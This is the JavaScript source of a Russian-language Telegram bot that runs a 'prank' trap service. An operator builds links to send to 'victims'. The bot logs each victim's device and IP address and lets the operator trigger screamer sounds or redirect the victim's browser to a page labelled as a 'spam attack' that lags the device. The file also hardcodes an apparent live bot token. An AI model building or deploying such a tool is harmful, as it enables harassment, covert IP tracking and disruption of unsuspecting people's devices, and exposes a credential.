const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const { v4: uuidv4 } = require('uuid');

// --- ПОДКЛЮЧЕНИЕ FFMPEG ---
const ffmpeg = require('fluent-ffmpeg');
const ffmpegPath = require('@ffmpeg-installer/ffmpeg').path;
ffmpeg.setFfmpegPath(ffmpegPath);

// --- НАСТРОЙКИ ---
const token = '8249796254:AAGV3kYCPf-siSmvl4SOXU4_44HS0y5RUPM';
const DOMAIN = 'https://prank-nfc.onrender.com';
const SUPPORT_USERNAME = '@your_support'; // Замените на ваш username поддержки

// Проверка глобальных переменных
if (!global.sessions || !global.activeVictims || !global.shortLinks) {
    console.error('❌ ОШИБКА: Глобальные переменные не инициализированы!');
    process.exit(1);
}

const bot = new TelegramBot(token, { 
    polling: {
        interval: 300,
        autoStart: true,
        params: { timeout: 10 }
    }
});

const UPLOAD_DIR = path.join(__dirname, 'public', 'uploads');
const wizardState = {};

console.log('🚀 NFC Bot запускается...');

// --- ГЕНЕРАТОР КОДА ---
function generateShortCode() {
    const chars = 'abcdefhkmnpqrstuvwxyz23456789';
    let result = '';
    for (let i = 0; i < 5; i++) result += chars.charAt(Math.floor(Math.random() * chars.length));
    if (global.shortLinks && global.shortLinks[result]) return generateShortCode();
    return result;
}

// --- ЗАГРУЗКА ФАЙЛОВ ---
async function downloadFile(fileId, type) {
    try {
        const link = await bot.getFileLink(fileId);
        const ext = path.extname(link);
        const name = `${type}_${Date.now()}_${uuidv4().slice(0,4)}${ext}`;
        const filePath = path.join(UPLOAD_DIR, name);
        
        const writer = fs.createWriteStream(filePath);
        const res = await axios({ url: link, method: 'GET', responseType: 'stream' });
        res.data.pipe(writer);

        return new Promise((resolve, reject) => {
            writer.on('finish', () => resolve({ url: `/uploads/${name}`, path: filePath }));
            writer.on('error', reject);
        });
    } catch (e) {
        console.error('Ошибка загрузки:', e);
        return { url: null, path: null };
    }
}

// --- FFMPEG ЛОГИКА ---
async function extractAudioFromVideo(videoPath) {
    return new Promise((resolve, reject) => {
        const audioPath = videoPath.replace(/\.(mp4|mov|avi|mkv)$/i, '.mp3');
        ffmpeg(videoPath)
            .toFormat('mp3')
            .audioCodec('libmp3lame')
            .audioBitrate('192k')
            .on('end', () => {
                const audioUrl = audioPath.replace(UPLOAD_DIR, '/uploads').replace(/\\/g, '/');
                resolve({ url: audioUrl, path: audioPath });
            })
            .on('error', (err) => reject(err))
            .save(audioPath);
    });
}

async function convertStickerToImage(stickerPath) {
    return new Promise((resolve, reject) => {
        const imagePath = stickerPath.replace(/\.webp$/i, '.jpg');
        ffmpeg(stickerPath)
            .outputOptions(['-vf', 'scale=800:800:force_original_aspect_ratio=decrease,pad=800:800:(ow-iw)/2:(oh-ih)/2:black'])
            .toFormat('mjpeg')
            .on('end', () => {
                const imageUrl = imagePath.replace(UPLOAD_DIR, '/uploads').replace(/\\/g, '/');
                fs.unlink(stickerPath, () => {});
                resolve({ url: imageUrl, path: imagePath });
            })
            .on('error', (err) => reject(err))
            .save(imagePath);
    });
}

// --- ГЛАВНОЕ МЕНЮ ---
function getMainMenu() {
    return {
        inline_keyboard: [
            [
                { text: '🎯 Создать ловушку', callback_data: 'create_new' },
                { text: '📂 Мои сессии', callback_data: 'my_sessions' }
            ],
            [
                { text: '📊 Статистика', callback_data: 'stats' },
                { text: '📖 Инструкция', callback_data: 'guide' }
            ],
            [
                { text: '💬 Тех. поддержка', url: `https://t.me/${SUPPORT_USERNAME.replace('@', '')}` }
            ]
        ]
    };
}

bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    const userName = msg.from.first_name || 'Пользователь';
    
    const welcomeText = `
🎭 <b>NFC Control Premium</b>

Привет, ${userName}! 👋

Добро пожаловать в систему управления пранками нового поколения.

<b>Возможности:</b>
• 🎯 Создание ловушек с кастомным контентом
• 🔊 Скримеры с любым звуком
• 🖼 Фоновые изображения и стикеры
• ☢️ Лаги на устройства
• 📊 Детальная статистика переходов

Выбери действие в меню ниже 👇`;

    bot.sendMessage(chatId, welcomeText, {
        parse_mode: 'HTML',
        reply_markup: getMainMenu()
    });
});

// --- ОБРАБОТКА CALLBACK КНОПОК ---
bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const data = query.data;

    // Главное меню
    if (data === 'main_menu') {
        const text = `
🎭 <b>NFC Control Premium</b>

Главное меню системы управления пранками.
Выбери нужное действие 👇`;

        bot.editMessageText(text, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'HTML',
            reply_markup: getMainMenu()
        });
        bot.answerCallbackQuery(query.id);
        return;
    }

    // Создать новую ловушку
    if (data === 'create_new') {
        wizardState[chatId] = { step: 1, data: {} };
        
        const text = `
<b>🎯 Создание новой ловушки</b>

<b>Шаг 1 из 2: Фоновое изображение</b>

Отправь мне:
• 🖼 Фото
• 🎨 Стикер
• 🎬 Видео (извлечется аудио)

Или напиши <code>skip</code> чтобы пропустить этот шаг.`;

        bot.editMessageText(text, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '❌ Отменить', callback_data: 'main_menu' }]
                ]
            }
        });
        bot.answerCallbackQuery(query.id, { text: '🎯 Начинаем создание...' });
        return;
    }

    // Мои сессии
    if (data === 'my_sessions') {
        if (!global.sessions) {
            bot.answerCallbackQuery(query.id, { text: '⚠️ Ошибка данных' });
            return;
        }
        
        const sessions = Object.values(global.sessions);
        if (sessions.length === 0) {
            bot.editMessageText('📂 <b>Мои сессии</b>\n\nУ вас пока нет активных сессий.\nСоздайте первую ловушку! 🎯', {
                chat_id: chatId,
                message_id: messageId,
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '🎯 Создать ловушку', callback_data: 'create_new' }],
                        [{ text: '🔙 Назад', callback_data: 'main_menu' }]
                    ]
                }
            });
            bot.answerCallbackQuery(query.id);
            return;
        }

        const recentSessions = sessions.slice(-5).reverse();
        
        bot.deleteMessage(chatId, messageId).catch(() => {});
        bot.sendMessage(chatId, `📂 <b>Ваши последние ${recentSessions.length} сессий:</b>`, { parse_mode: 'HTML' });
        
        for (const s of recentSessions) {
            await new Promise(resolve => setTimeout(resolve, 300));
            sendControlPanel(chatId, s.id);
        }
        
        bot.answerCallbackQuery(query.id, { text: '📂 Список сессий' });
        return;
    }

    // Статистика
    if (data === 'stats') {
        const vCount = Object.keys(global.activeVictims || {}).length;
        const sCount = Object.keys(global.sessions || {}).length;
        
        let totalVictims = 0;
        Object.values(global.sessions || {}).forEach(s => {
            totalVictims += s.totalVictims || 0;
        });

        const statsText = `
📊 <b>Общая статистика</b>

🎯 <b>Активные сессии:</b> ${sCount}
👥 <b>Жертв онлайн:</b> ${vCount}
👁 <b>Всего переходов:</b> ${totalVictims}

🌐 <b>Домен:</b> <code>${DOMAIN}</code>

📅 <b>Обновлено:</b> ${new Date().toLocaleString('ru-RU')}`;

        bot.editMessageText(statsText, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🔄 Обновить', callback_data: 'stats' }],
                    [{ text: '🔙 Назад', callback_data: 'main_menu' }]
                ]
            }
        });
        bot.answerCallbackQuery(query.id, { text: '📊 Статистика обновлена' });
        return;
    }

    // Инструкция
    if (data === 'guide') {
        const guideText = `
📖 <b>Инструкция по использованию</b>

<b>Как создать ловушку:</b>

1️⃣ Нажми "Создать ловушку"
2️⃣ Отправь фоновое изображение (или skip)
3️⃣ Отправь звук для скримера (или skip)
4️⃣ Получи готовую ссылку

<b>Управление:</b>
🔊 <b>Скример</b> - воспроизвести звук
☢️ <b>Запустить лаги</b> - отправит на сайт с лагами
🔄 <b>Обновить</b> - обновить информацию
❌ <b>Удалить</b> - удалить сессию

<b>Форматы файлов:</b>
• Изображения: JPG, PNG
• Стикеры: WEBP (автоконвертация)
• Звук: MP3, OGG, M4A, голосовые
• Видео: MP4, MOV (извлечётся аудио)

<b>💡 Совет:</b> Используйте короткие звуки (до 10 сек) для лучшего эффекта скримера.`;

        bot.editMessageText(guideText, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🔙 Назад', callback_data: 'main_menu' }]
                ]
            }
        });
        bot.answerCallbackQuery(query.id, { text: '📖 Инструкция' });
        return;
    }

    // Управление сессиями
    if (data.includes('_')) {
        const [action, sessionId] = data.split('_');
        const s = global.sessions ? global.sessions[sessionId] : null;

        if (!s && action !== 'del') {
            bot.answerCallbackQuery(query.id, { text: '⚠️ Сессия не найдена' });
            return;
        }
        
        if (!global.io) {
            bot.answerCallbackQuery(query.id, { text: '⚠️ Ошибка сервера' });
            return;
        }

        switch (action) {
            case 'scare':
                global.io.to(sessionId).emit('play-sound');
                bot.answerCallbackQuery(query.id, { text: '🔊 Скример активирован!', show_alert: true });
                break;

            case 'bomb':
                global.io.to(sessionId).emit('force-redirect', { url: `${DOMAIN}/volumeshader_bm.html` });
                bot.answerCallbackQuery(query.id, { text: '☢️ Спам-атака запущена!', show_alert: true });
                break;

            case 'refresh':
                bot.deleteMessage(chatId, messageId).catch(() => {});
                sendControlPanel(chatId, sessionId);
                bot.answerCallbackQuery(query.id, { text: '🔄 Обновлено' });
                break;

            case 'del':
                const confirmText = `
⚠️ <b>Подтверждение удаления</b>

Вы уверены, что хотите удалить эту сессию?

Код: <code>${s.shortCode}</code>
Переходов: ${s.totalVictims}

<b>Это действие необратимо!</b>`;

                bot.editMessageText(confirmText, {
                    chat_id: chatId,
                    message_id: messageId,
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: '✅ Да, удалить', callback_data: `confirm_del_${sessionId}` },
                                { text: '❌ Отмена', callback_data: `refresh_${sessionId}` }
                            ]
                        ]
                    }
                });
                bot.answerCallbackQuery(query.id);
                break;

            case 'confirm_del':
                if (global.sessions[sessionId]) delete global.sessions[sessionId];
                if (s && global.shortLinks[s.shortCode]) delete global.shortLinks[s.shortCode];
                
                bot.deleteMessage(chatId, messageId).catch(() => {});
                bot.sendMessage(chatId, '✅ Сессия успешно удалена', {
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '🔙 В главное меню', callback_data: 'main_menu' }]
                        ]
                    }
                });
                bot.answerCallbackQuery(query.id, { text: '✅ Удалено' });
                break;

            case 'info':
                const infoText = `
ℹ️ <b>Информация о сессии</b>

🆔 <b>ID:</b> <code>${s.id}</code>
🔗 <b>Короткий код:</b> <code>${s.shortCode}</code>
📅 <b>Создана:</b> ${s.createdAt.toLocaleString('ru-RU')}

<b>Настройки:</b>
• Фон: ${s.image ? '✅ Установлен' : '❌ Не установлен'}
• Звук: ${s.sound ? '✅ Установлен' : '❌ Не установлен'}

<b>Статистика:</b>
• Всего переходов: ${s.totalVictims}
• Последняя активность: ${new Date(s.lastActiveAt).toLocaleString('ru-RU')}`;

                bot.answerCallbackQuery(query.id, { text: 'ℹ️ Подробная информация', show_alert: false });
                
                bot.sendMessage(chatId, infoText, {
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '🔙 К панели', callback_data: `refresh_${sessionId}` }]
                        ]
                    }
                });
                break;
        }
    }
});

// --- ОБРАБОТКА СООБЩЕНИЙ ---
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;

    // Игнорируем команды
    if (text && text.startsWith('/')) return;

    // --- WIZARD ---
    if (wizardState[chatId]) {
        const st = wizardState[chatId];

        // ШАГ 1: ФОН
        if (st.step === 1) {
            const loadingMsg = await bot.sendMessage(chatId, '⏳ <b>Обработка файла...</b>', { parse_mode: 'HTML' });
            
            try {
                if (msg.photo) {
                    const f = await downloadFile(msg.photo[msg.photo.length - 1].file_id, 'img');
                    st.data.image = f.url || '';
                    st.data.sound = '';
                } 
                else if (msg.sticker) {
                    const f = await downloadFile(msg.sticker.file_id, 'sticker');
                    if (f.path) {
                        const converted = await convertStickerToImage(f.path);
                        st.data.image = converted.url || '';
                    }
                    st.data.sound = '';
                }
                else if (msg.video || msg.video_note) {
                    const fileId = msg.video ? msg.video.file_id : msg.video_note.file_id;
                    const f = await downloadFile(fileId, 'video');
                    if (f.path) {
                        const audioData = await extractAudioFromVideo(f.path);
                        st.data.sound = audioData.url || '';
                    }
                    st.data.image = '';
                }
                else if (text && text.toLowerCase() === 'skip') {
                    st.data.image = '';
                    st.data.sound = '';
                }
                else {
                    bot.deleteMessage(chatId, loadingMsg.message_id).catch(()=>{});
                    bot.sendMessage(chatId, '⚠️ <b>Неверный формат</b>\n\nОтправь фото, стикер, видео или напиши <code>skip</code>', { 
                        parse_mode: 'HTML',
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: '❌ Отменить', callback_data: 'main_menu' }]
                            ]
                        }
                    });
                    return;
                }
            } catch (e) {
                console.error(e);
                bot.deleteMessage(chatId, loadingMsg.message_id).catch(()=>{});
                bot.sendMessage(chatId, '❌ Ошибка обработки файла. Попробуй снова.', {
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '❌ Отменить', callback_data: 'main_menu' }]
                        ]
                    }
                });
                return;
            }

            bot.deleteMessage(chatId, loadingMsg.message_id).catch(()=>{});
            
            st.step = 2;
            
            const soundText = st.data.sound 
                ? '✅ <b>Звук уже извлечён из видео!</b>\n\nМожешь отправить другой звук или напиши <code>skip</code> для завершения.' 
                : '<b>Шаг 2 из 2: Звук для скримера</b>\n\nОтправь мне:\n• 🔊 Аудиофайл\n• 🎤 Голосовое сообщение\n• 🎬 Видео\n\nИли напиши <code>skip</code> чтобы пропустить.';
            
            bot.sendMessage(chatId, soundText, { 
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '❌ Отменить', callback_data: 'main_menu' }]
                    ]
                }
            });
            return;
        }

        // ШАГ 2: ЗВУК
        if (st.step === 2) {
            if (!st.data.sound || (msg.audio || msg.voice || msg.video)) {
                const loadingMsg = await bot.sendMessage(chatId, '⏳ <b>Загрузка звука...</b>', { parse_mode: 'HTML' });
                 
                try {
                    if (msg.audio) {
                        const f = await downloadFile(msg.audio.file_id, 'snd');
                        st.data.sound = f.url || '';
                    }
                    else if (msg.voice) {
                        const f = await downloadFile(msg.voice.file_id, 'voice');
                        st.data.sound = f.url || '';
                    }
                    else if (msg.video) {
                        const f = await downloadFile(msg.video.file_id, 'video');
                        if (f.path) {
                            const audioData = await extractAudioFromVideo(f.path);
                            st.data.sound = audioData.url || '';
                        }
                    }
                    else if (text && text.toLowerCase() === 'skip') {
                        // Пропускаем
                    }
                    else {
                        bot.deleteMessage(chatId, loadingMsg.message_id).catch(()=>{});
                        bot.sendMessage(chatId, '⚠️ <b>Неверный формат</b>\n\nОтправь аудио, голосовое или напиши <code>skip</code>', {
                            parse_mode: 'HTML',
                            reply_markup: {
                                inline_keyboard: [
                                    [{ text: '❌ Отменить', callback_data: 'main_menu' }]
                                ]
                            }
                        });
                        return;
                    }
                } catch (e) {
                    console.error(e);
                }
                 
                bot.deleteMessage(chatId, loadingMsg.message_id).catch(()=>{});
            }

            finishSessionCreation(chatId, st.data);
            delete wizardState[chatId];
        }
    }
});

// --- СОЗДАНИЕ СЕССИИ ---
function finishSessionCreation(chatId, data) {
    const id = uuidv4();
    const code = generateShortCode();

    const session = {
        id: id,
        shortCode: code,
        image: data.image || '',
        sound: data.sound || '',
        autoMode: true,
        totalVictims: 0,
        createdAt: new Date(),
        lastActiveAt: Date.now(),
        imagesFiles: [],
        soundsFiles: []
    };

    global.sessions[id] = session;
    global.shortLinks[code] = id;

    const successText = `
✅ <b>Ловушка успешно создана!</b>

🔗 <b>Ваша ссылка:</b>
<code>${DOMAIN}/${code}</code>

🆔 <b>Короткий код:</b> <code>${code}</code>

<b>Настройки:</b>
• Фон: ${data.image ? '✅' : '❌'}
• Звук: ${data.sound ? '✅' : '❌'}

Отправь ссылку жертве и управляй через панель! 🎮`;

    bot.sendMessage(chatId, successText, { parse_mode: 'HTML' });
    
    setTimeout(() => sendControlPanel(chatId, id), 500);
}

// --- ПАНЕЛЬ УПРАВЛЕНИЯ ---
function sendControlPanel(chatId, sessionId) {
    const s = global.sessions[sessionId];
    if (!s) {
        bot.sendMessage(chatId, '⚠️ Сессия не найдена.', {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🔙 В главное меню', callback_data: 'main_menu' }]
                ]
            }
        });
        return;
    }

    const victims = Object.values(global.activeVictims || {}).filter(v => v.roomId === sessionId);
    const link = `${DOMAIN}/${s.shortCode}`;
    
    // Эмодзи статусов
    const bgStatus = s.image ? '🟢' : '🔴';
    const soundStatus = s.sound ? '🟢' : '🔴';
    
    let statusText = `
🎮 <b>Панель управления</b>

🔗 <b>Ссылка:</b> <code>${link}</code>
🆔 <b>Код:</b> <code>${s.shortCode}</code>

⚙️ <b>Настройки:</b>
${bgStatus} Фон: ${s.image ? 'Установлен' : 'Отсутствует'}
${soundStatus} Звук: ${s.sound ? 'Установлен' : 'Отсутствует'}

📊 <b>Статистика:</b>
👥 Онлайн: <b>${victims.length}</b>
👁 Переходов: <b>${s.totalVictims}</b>`;

    if (victims.length > 0) {
        statusText += `\n\n📱 <b>Подключенные устройства:</b>`;
        victims.forEach((v, i) => {
            statusText += `\n${i + 1}. ${v.device} • ${v.ip}`;
        });
    }

    const keyboard = [
        [
            { text: '🔊 Скример', callback_data: `scare_${sessionId}` },
            { text: '☢️ Спам-атака', callback_data: `bomb_${sessionId}` }
        ],
        [
            { text: '🔄 Обновить', callback_data: `refresh_${sessionId}` },
            { text: 'ℹ️ Подробнее', callback_data: `info_${sessionId}` }
        ],
        [
            { text: '❌ Удалить сессию', callback_data: `del_${sessionId}` }
        ]
    ];

    bot.sendMessage(chatId, statusText, {
        parse_mode: 'HTML',
        reply_markup: { inline_keyboard: keyboard }
    }).catch(err => console.error('Ошибка отправки панели:', err.message));
}

// --- ОБРАБОТКА ОШИБОК ---
bot.on('polling_error', (error) => {
    console.error('Polling error:', error.message);
});

bot.on('error', (error) => {
    console.error('Bot error:', error.message);
});

console.log('✅ NFC Bot готов к работе!');

module.exports = bot;
